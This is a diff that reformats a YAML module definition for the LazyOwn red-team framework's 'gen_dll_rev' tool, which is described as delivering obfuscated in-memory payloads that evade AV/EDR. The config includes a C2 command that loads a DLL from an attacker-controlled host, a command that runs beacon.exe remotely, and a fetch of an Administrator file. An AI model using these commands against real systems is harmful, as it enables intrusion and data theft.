@@ -1,14 +1,20 @@
 name: gen_dll_rev
-description: >
-  gen_dll_rev is a next-generation, automated framework for generating, obfuscating, and delivering gen_dll_rev in pure C to windows machines. Designed for red team operations, penetration testing, and offensive research, gen_dll_rev empowers attackers to deploy stealthy, payloads that execute directly in memory — bypassing traditional AV/EDR detection mechanisms using Early Bird APC Injection and NT Native API Calls.
-author: "LazyOwn RedTeam"
-version: "1.0"
+description: 'gen_dll_rev is a next-generation, automated framework for generating,
+  obfuscating, and delivering gen_dll_rev in pure C to windows machines. Designed
+  for red team operations, penetration testing, and offensive research, gen_dll_rev
+  empowers attackers to deploy stealthy, payloads that execute directly in memory
+  — bypassing traditional AV/EDR detection mechanisms using Early Bird APC Injection
+  and NT Native API Calls.
+
+  '
+author: LazyOwn RedTeam
+version: '1.0'
 enabled: true
 params:
-  - name: lhost
-    type: string
-    required: true
-    description: lhost target.
+- name: lhost
+  type: string
+  required: true
+  description: lhost target.
 tool:
   name: gen_dll_rev
   repo_url: https://github.com/grisuno/beacon.git
@@ -19,3 +25,4 @@ tool:
   remote_command: windows .\beacon.exe
   download_file: C:\Users\Administrator\Desktop\root.txt
   lazycommand: issue_command_to_c2 windows load_module:http://{lhost}/module.dll
+category: 04. Post-Exploitation
